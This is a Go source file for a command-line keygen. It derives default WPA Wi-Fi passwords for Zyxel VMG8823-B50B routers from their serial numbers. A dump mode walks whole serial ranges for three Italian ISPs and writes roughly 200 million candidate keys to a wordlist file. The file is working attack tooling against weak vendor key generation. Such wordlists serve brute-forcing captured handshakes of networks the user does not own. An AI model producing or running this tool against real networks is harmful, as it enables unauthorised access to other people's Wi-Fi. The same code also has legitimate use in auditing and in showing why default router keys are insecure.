package main

import (
	"fmt"
	"github.com/docopt/docopt.go"
	"zykgen"
	"os"
	"strconv"
	"time"
	"github.com/schollz/progressbar/v3"
)

// Usage (--help) message
const usage = `Zyxel VMG8823-B50B WPA Keygen

Usage:
  zykgen --pass (-m|-n|-c) [-o <file>] [-l <length>] <serial>
  zykgen --dump (-m|-n|-c) -o <file> [-l <length>] <RouterSerialRange>
  zykgen -h | --help

Options:
  <RouterSerialRange>	  "homelife" or "infostrada" or "tiscali"
  -o <file>       Output file
  -l <length>     Output key length [default: 10].
  -h --help       Show this screen.`

// Struct representing args from the usage message
var args struct {
	Serial       string `docopt:"<serial>"`
	RouterSerialRange  string `docopt:"<RouterSerialRange>"`
	Length       int    `docopt:"-l"`
	Mojito       bool   `docopt:"-m"`
	Negroni      bool   `docopt:"-n"`
	Cosmopolitan bool   `docopt:"-c"`
	File		 string	`docopt:"-o"`
	Pass		 bool 	`docopt:"--pass"`
	Dump	     bool   `docopt:"--dump"`
}

func main() {
	// Parse the docopt args and check for errors
	opts, err := docopt.DefaultParser.ParseArgs(usage, os.Args[1:], "")
	if err != nil { return }
	opts.Bind(&args)

	// Set the letterlist from the args -m|-n|-c. For some unknown reason it's called a "cocktail"
	var cocktail zykgen.Cocktail
	if args.Mojito {
		cocktail = zykgen.Mojito
	} else if args.Negroni {
		cocktail = zykgen.Negroni
	} else if args.Cosmopolitan {
		cocktail = zykgen.Cosmopolitan
	}

	if args.Pass {       // --pass command
		password := zykgen.GetPassword(args.Serial, args.Length, cocktail)	// Generate the password
		fmt.Printf("Serial: %s\nPassword: %s", args.Serial, password)

		// Write to file if there is the "-o <file>" option
		if len(args.File) > 0 {
			writeToFile(args.File, fmt.Sprintf("Serial: %s\nPassword: %s", args.Serial, password))
		}
	}else if args.Dump{	 // --dump command
		var RouterSerialRange = getRouterSerialRange(args.RouterSerialRange)
		fmt.Println("Writing passwords to file...")
		passwordRangeToFile(args.Length, cocktail, RouterSerialRange, args.File)
	}
}

// Writes a string to a file
func writeToFile(filename string, content string){
	file, err := os.Create(filename)
    if err != nil {
        return
    }
    defer file.Close()
    file.WriteString(content)
}

// Returns a RouterSerialRange if the input string is valid, otherwise call os.Exit()
func getRouterSerialRange(text string) (RouterSerialRange){
	if args.RouterSerialRange == "homelife" {
		return RangeHomeLife
	} else if args.RouterSerialRange == "infostrada" {
		return RangeInfostrada
	} else if args.RouterSerialRange == "tiscali" {
		return RangeTiscali
	} 

	fmt.Println("RouterSerialRange is not valid! Pick something between 'homelife', 'infostrada', 'tiscali'")
	os.Exit(-1)
	return RouterSerialRange{}
}


// Defines a Serial range for a router, for example from R182V to S192V
type RouterSerialRange struct {
    first, second string
}
var (
    RangeHomeLife = RouterSerialRange{"S182V", "S192V"}
    RangeInfostrada = RouterSerialRange{"S172V", "S182V"}
	RangeTiscali = RouterSerialRange{"S172V", "S182V"}
)

// Writes a password range to a file
func passwordRangeToFile(length int, cocktail zykgen.Cocktail, routerSerialRange RouterSerialRange, filename string){
	rangeNumEnd := 99999999
	pbar := progressbar.Default(int64(rangeNumEnd*2))

	// Write output to file
	file, err := os.Create(filename)
	if err != nil {
		return
	}
	defer file.Close()
	
	// Start progressbar updater thread
	i:=0
	x:=0
	go func() {
		for {
			pbar.Set(i+x)
			time.Sleep(time.Second)
		}
	}()

	// Iterate through first range i.e for homelife "S182V"
	for i = 0; i <= rangeNumEnd; i++ {
        serial := fmt.Sprintf("%s%08s", routerSerialRange.first, strconv.Itoa(i))	// Get generated serial
		password := zykgen.GetPassword(serial, length, cocktail)	// Get password from serial
		file.WriteString(fmt.Sprintf("%s\n", password))  // Write to file
    }

	// Iterate through second range i.e for homelife "S192V"
	for x = 0; x <= rangeNumEnd; x++ {
		serial := fmt.Sprintf("%s%08s", routerSerialRange.second, strconv.Itoa(x))	// Get generated serial
		password := zykgen.GetPassword(serial, length, cocktail)	// Get password from serial
		file.WriteString(fmt.Sprintf("%s\n", password))  // Write to file
	}

	file.Close()
	pbar.Set(rangeNumEnd*2)	// Set progressbar to 100%
	return
}